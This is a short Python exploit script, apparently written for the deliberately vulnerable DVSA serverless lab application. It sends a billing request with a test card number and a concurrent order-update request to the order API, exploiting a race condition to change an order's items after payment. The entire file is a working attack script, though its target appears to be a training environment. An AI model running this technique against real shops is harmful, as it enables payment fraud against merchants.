import threading
import requests
import time

ORDER_ID = ""
TOKEN = ""
URL = "https://9v3sovt0ed.execute-api.us-east-1.amazonaws.com/dvsa/order"
headers = {"Authorization": TOKEN, "Content-Type": "application/json"}

def billing():
    payload = '{"action":"billing","order-id":"' + ORDER_ID + '","data":{"ccn":"4242424242424242","exp":"12/26","cvv":"123"}}'
    r = requests.post(URL, data=payload, headers=headers)
    print("BILLING:", r.text)

def update():
    time.sleep(0.5)  
    payload = '{"action":"update","order-id":"' + ORDER_ID + '","items":{"1013":5}}'
    r = requests.post(URL, data=payload, headers=headers)
    print("UPDATE:", r.text)

t1 = threading.Thread(target=billing)
t2 = threading.Thread(target=update)

t1.start()
t2.start()

t1.join()
t2.join()

print("DONE!")